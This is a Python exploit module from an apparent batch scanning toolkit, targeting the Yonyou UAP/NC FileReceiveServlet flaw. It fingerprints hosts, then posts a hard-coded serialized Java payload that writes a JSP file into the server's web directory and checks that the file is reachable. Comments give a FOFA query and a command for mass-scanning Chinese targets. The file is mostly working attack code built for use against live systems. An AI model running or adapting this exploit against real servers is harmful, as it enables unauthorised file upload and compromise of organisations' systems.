# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# fofa: 用友 && country="CN"
# python3 batch.py -m exploit.scripts.OA.yonyou.uap.deserialize_FileReceiveServlet -cs -fs "icon_hash=\"1085941792\""

class Script(BaseScript):
    name = 'yonyou-uap'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.DESERIALIZE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = 'https://www.adminxe.com/2075.html'
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/servlet/FileReceiveServlet']
        # 相关信息
        self.info = r'''2020年hw NC6.5以及之后版本。根据文档，FileReceiveServlet所对应的类为com.yonyou.ante.servlet.FileReceiveServlet。jar包所在目录:/yonyou\home\modules\uapss\lib ,由于68行代码通过File outFile = new File(path, fileName)创建了一个文件，导致攻击者可通过此进行任意文件上传。
        '''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if '../Client/Uclient/UClient.dmg' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'multipart/form-data;'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78t0test0ls"
                await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                url2 = f'http://{self.target}/t00ls.jsp' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/t00ls.jsp'
                text2 = await AsyncFetcher.fetch(session=session, url=url2, headers=self.headers, timeout=self.req_timeout)
                if 't0test0ls' in text2:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url2))
                    return {'name': '{} FileReceiveServlet'.format(self.name), 'url': url2, 'software': self.name}


if __name__ == '__main__':
    pass